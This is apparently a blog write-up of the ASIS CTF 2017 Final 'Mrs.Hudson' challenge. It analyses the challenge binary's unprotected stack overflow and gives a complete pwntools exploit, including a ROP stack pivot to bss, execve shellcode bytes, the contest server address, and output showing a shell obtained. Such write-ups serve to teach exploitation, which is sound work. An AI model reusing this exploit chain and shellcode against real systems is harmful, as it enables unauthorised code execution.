---
author: zero
comments: true
date: 2017-09-14 00:00:00 
layout: post
slug: asis-ctf-2017-final-mrs.hudson 
title: ASIS-CTF-2017-FINAL-Mrs.Hudson 
---

**Description**:
England would fall if Mrs. Hudson leaves Baker Street. Mrs. Hudson is the first one who is totally exploited by Sherlock, or Does She?


## File

```
~/Desktop                                                         
▶ file hudson
hudson: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a99b54f5a0f90ebade826e34188ac1f5eebb2cc7, not stripped
```

The given binary was not stripped, which often implies either the challenge is extremely difficult or simple.
 
## Protections

```
~/Desktop 
▶ checksec --file hudson
[*] '/home/zero/Desktop/hudson'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

No protections were enabled, which made it eaiser for me to solve. 

## Program

{% highlight c %}
000000000040061a <main>:
  40061a:       55                      push   %rbp
  40061b:       48 89 e5                mov    %rsp,%rbp
  40061e:       48 83 c4 80             add    $0xffffffffffffff80,%rsp
  400622:       89 7d 8c                mov    %edi,-0x74(%rbp)
  400625:       48 89 75 80             mov    %rsi,-0x80(%rbp)
  400629:       48 8b 05 20 0a 20 00    mov    0x200a20(%rip),%rax        # 601050 <stdin@@GLIBC_2.2.5>
  400630:       b9 00 00 00 00          mov    $0x0,%ecx
  400635:       ba 02 00 00 00          mov    $0x2,%edx
  40063a:       be 00 00 00 00          mov    $0x0,%esi
  40063f:       48 89 c7                mov    %rax,%rdi
  400642:       e8 c9 fe ff ff          callq  400510 <setvbuf@plt>
  400647:       48 8b 05 f2 09 20 00    mov    0x2009f2(%rip),%rax        # 601040 <__TMC_END__>
  40064e:       b9 00 00 00 00          mov    $0x0,%ecx
  400653:       ba 02 00 00 00          mov    $0x2,%edx
  400658:       be 00 00 00 00          mov    $0x0,%esi
  40065d:       48 89 c7                mov    %rax,%rdi
  400660:       e8 ab fe ff ff          callq  400510 <setvbuf@plt>
  400665:       bf 14 07 40 00          mov    $0x400714,%edi
  40066a:       e8 91 fe ff ff          callq  400500 <puts@plt>
  40066f:       48 8d 45 90             lea    -0x70(%rbp),%rax
  400673:       48 89 c6                mov    %rax,%rsi
  400676:       bf 2b 07 40 00          mov    $0x40072b,%edi
  40067b:       b8 00 00 00 00          mov    $0x0,%eax
  400680:       e8 9b fe ff ff          callq  400520 <__isoc99_scanf@plt>
  400685:       c9                      leaveq 
  400686:       c3                      retq   
{% endhighlight %}

The program was very small enough that I used objdump instead of IDA to see what the program does. It simply prints a text and waits for the user input using scanf. 

## Analysis 

```
~/Desktop                                                         
▶ ./hudson
Let's go back to 2000.
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[1]    87899 segmentation fault (core dumped)  ./hudson
```   

As a first step, I ran the program.  I gave in a large number of 'a' to see if it would crash the program and it did.  

It turned out to be a simple stack overflow. Since there were no protections, I was immediately thinking of redirecting rip to the address of buffer that has my shellcode. But, the issue with this method was that I have no way of knowing the address of buffer without some form of leak. 

Thus, I either had to use rop or store the shellcode in static address that would not get affected by aslr. I went with the second method since the organizer did not provide libc for this problem.


## Exploit

As the output of the program suggested, I pivoted a stack to bss and read in the shellcode near bss. This was done so that it executes my shellcode when the program returns from the fake stack.

{% highlight python %}
from pwn import *
import sys

context.log_level=True

local = 1

libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

if local:
        r = remote("localhost",5555)
        pause()
else:
        r = remote("178.62.249.106",8642)
        pause()


puts = p64(0x000000000040066a)
prdi = p64(0x004006f3)
main = p64(0x000000000040066f)
prsi = p64(0x004006f1)
prbp = p64(0x00400575)
leave = p64(0x0000000000400685)

payload = "A"*120
payload += prsi #pop rsi ; pop r15 ; ret  ;  (1 found)
payload += p64(0x601081) #bss
payload += p64(0x41) #junk
payload += prbp #pop rbp ; ret  ;  (1 found)   
payload += p64(0x000000000601079) #stack pivot
payload += p64(0x0000000000400676) #scanf
payload += p64(0x0000000000601050) #near bss (calculated)

s ="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

r.recvuntil(".")
r.sendline(payload)

r.sendline(p64(0x000000000601089)+s) #read in shellcode 

r.interactive()

{% endhighlight %}

The result of running the exploit

```
~/Desktop                                                                                                                           
▶ python hudson.py
[*] '/lib/x86_64-linux-gnu/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to localhost on port 5555: Done
[*] Paused (press any to continue)
[*] Switching to interactive mode
$ id
uid=1000(zero) gid=1000(zero) groups=1000(zero),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$ exit
[*] Got EOF while reading in interactive
``` 
